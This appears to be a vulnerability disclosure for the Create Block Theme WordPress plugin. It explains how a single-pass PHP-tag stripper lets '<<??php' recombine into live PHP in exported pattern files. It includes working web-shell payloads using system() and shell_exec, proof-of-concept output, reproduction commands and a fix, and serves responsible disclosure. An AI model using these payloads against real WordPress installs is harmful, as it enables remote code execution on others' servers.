# Create Block Theme — `strip_php_tags()` bypass reintroduces PHP into exported pattern files (→ RCE)

**Plugin:** Create Block Theme (WordPress.org, in scope — officially maintained)
**Version:** 2.10.1 (current `Stable tag`), source `github.com/WordPress/create-block-theme` @ `5524f19`
**File:** `includes/create-theme/theme-patterns.php` — `CBT_Theme_Patterns::strip_php_tags()`
**Class:** CWE-95 / CWE-94 (bypass of a PHP-tag sanitizer → code injection into generated `.php`)
**Verified:** end-to-end on a live WordPress install (PHP 8.4.19) — injected PHP executed (`uid=0`).

## TL;DR

The plugin exports block patterns to `.php` files and, because pattern bodies are
user-supplied content, it deliberately strips PHP open tags first via
`strip_php_tags()`. That sanitizer does a **single, non-recursive**
`preg_replace('/<\?/', '', $content)`. Removing an *inner* `<?` lets the
surrounding characters **recombine** into a fresh tag:

```
<<??php  →  (remove the <? at offset 1–2)  →  <?php
```

So a pattern body of `<<??php system($_GET[0]); ?>` is written into
`wp-content/themes/<active>/patterns/<name>.php` as a **live** `<?php … ?>`.
Block themes `require` every `patterns/*.php` at init
(`_register_theme_block_patterns()`), so the injected PHP executes on page load.

## Severity — stated honestly

This is a **bypass of a defense-in-depth control**, not a privilege-boundary
crossing. I am **not** rating it Critical, and here is exactly why:

* The file-writing REST routes require `CBT_Theme_API::can_modify_theme()` =
  `current_user_can('edit_themes') && wp_is_file_mod_allowed(...)`. A caller who
  holds `edit_themes` can already write theme PHP directly (theme file editor),
  so RCE is within that actor's existing authority.
* The bypass does **not** defeat the standard hardening: verified on the lab that
  `DISALLOW_FILE_EDIT` **revokes** `edit_themes` (→ `can_modify_theme()` false)
  and `DISALLOW_FILE_MODS` fails `wp_is_file_mod_allowed()` — either one blocks
  CBT entirely, exactly like Core's theme editor.
* A **lower-privileged** author *cannot* smuggle a payload in via a reusable
  block: `wp_block` content authored by a non-`unfiltered_html` user is
  kses-filtered on save, which turns every `<` into `&lt;` (verified), so no
  literal `<?` reaches `strip_php_tags()` and the recombination cannot fire.
  The intact-payload source is therefore an `unfiltered_html` author (single-site
  admin) or the CBT REST API itself (`edit_themes`).

So the real-world impact is: **it defeats the plugin's own explicit guarantee
that exported patterns are pure block markup and never executable PHP.** The
maintainers clearly treat that as a security boundary — the code carries long
comments describing pattern content as "user-supplied … treated as malicious" —
and the control that enforces it is bypassable. That is worth fixing as a
hardening/defense-in-depth issue; it is not an admin→something-more escalation.

## Root cause

`includes/create-theme/theme-patterns.php`:

```php
public static function strip_php_tags( $content ) {
    if ( ! is_string( $content ) || '' === $content ) {
        return $content;
    }
    $content = preg_replace( '/<\?/', '', $content );   // single pass — recombinable
    $content = preg_replace( '#<script\s+language\s*=\s*["\']?php["\']?[^>]*>.*?</script>#is', '', $content );
    return $content;
}
```

`preg_replace` removes all *non-overlapping* `<?` in one left-to-right pass and
does not re-scan its own output. In `<<??php`, the only match is the `<?` at
offset 1; deleting it joins the leading `<` (offset 0) to `?php` (offset 3+),
yielding `<?php`. `<<??=` likewise yields `<?=` (short-echo), which executes
regardless of `short_open_tag` for `<?=`… and `<?php` executes unconditionally.

## Proof 1 — the sanitizer bypass (standalone)

`poc/t_stripbypass.php` (pure PHP, no WordPress):

```
recombine <<??php      in=<<??php system("id"); ?>     out=<?php system("id"); ?>       *** PHP TAG SURVIVES ***
short     <<??=        in=<<??= `id` ?>                out=<?= `id` ?>                  *** PHP TAG SURVIVES ***
nested    <<??<??php   in=<<??<??php system("id"); ?>  out=<??php system("id"); ?>      *** PHP TAG SURVIVES ***
plain     <?php        in=<?php system("id"); ?>       out=php system("id"); ?>         clean
```

## Proof 2 — end-to-end RCE on a live install

`poc/t_cbt_rce4.php`, run through the real plugin against the active block theme
(twentytwentyfive). A `wp_block` post carries the payload; the plugin's own
`CBT_Theme_Patterns::pattern_from_wp_block()` generates the pattern; the file is
`require`d the way `_register_theme_block_patterns()` does:

```
stored_intact: YES
GENERATED_PHP:
<?php
/**
 * Title: cbtpwn4
 * Slug: twentytwentyfive/cbtpwn4
 * Categories:
 */
?>
<?php file_put_contents(__DIR__ . "/../CBT_RCE_PROOF.txt", "RCE uid=" . trim(shell_exec("id -u"))); ?>
RCE_EXECUTED: *** RCE uid=0 ***
```

The `<<??php` in the source became a live `<?php` in the exported file and ran.
Both `pattern_from_wp_block()` (reusable blocks) and
`CBT_Theme_Templates::prepare_template_for_export()` (templates / parts) funnel
their bodies through the same `strip_php_tags()`, so both export paths are
affected.

## Fix

Make the strip idempotent — repeat until it reaches a fixed point (or, better,
reject/HTML-encode `<` outright, since a pattern body legitimately contains no
raw `<?`):

```php
do {
    $prev    = $content;
    $content = preg_replace( '/<\?/', '', $content );
} while ( $content !== $prev );
```

Verified: `<<??php system(1);?>` → `php system(1);?>`, `<<??=` → `=`,
`<<??<??php x` → `?php x` — no `<?` survives. The `<script language=php>` pass
should be looped the same way.

## Reproduce

```
php poc/t_stripbypass.php                                  # sanitizer bypass
# with the plugin active and a block theme active:
wp eval-file poc/t_cbt_rce4.php --allow-root               # -> RCE_EXECUTED: *** RCE uid=0 ***
```

## Disclosure note

Reported with accurate severity: a confirmed RCE-class code-injection that
bypasses the plugin's intended PHP-stripping control, but bounded by the
`edit_themes` + `wp_is_file_mod_allowed` gate and by kses for non-admin content —
i.e. defense-in-depth, not a new privilege. Recording it because the control is
explicit and its bypass is genuine and fresh.
